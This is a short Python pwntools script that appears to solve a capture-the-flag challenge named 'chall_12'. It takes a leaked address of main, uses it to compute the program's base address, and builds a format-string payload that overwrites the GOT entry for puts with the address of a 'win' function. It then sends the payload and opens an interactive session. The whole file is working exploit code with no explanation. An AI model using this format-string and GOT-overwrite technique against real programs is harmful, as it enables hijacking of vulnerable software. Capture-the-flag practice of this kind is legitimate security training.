# coding: utf-8
from pwn import *
elf=ELF("./chall_12")
#elf.address
p=process("./chall_12")
p.recvuntil(b':')
leak = p.recv()
#leak
intleak = int(leak,16)
#intleak
elf.address = intleak - elf.sym['main']
#elf.address
#hex(_)
payload = fmtstr_payload(7,{elf.got.puts:elf.sym.win},write_size='byte')
#payload
p.sendline(payload)
p.interactive()
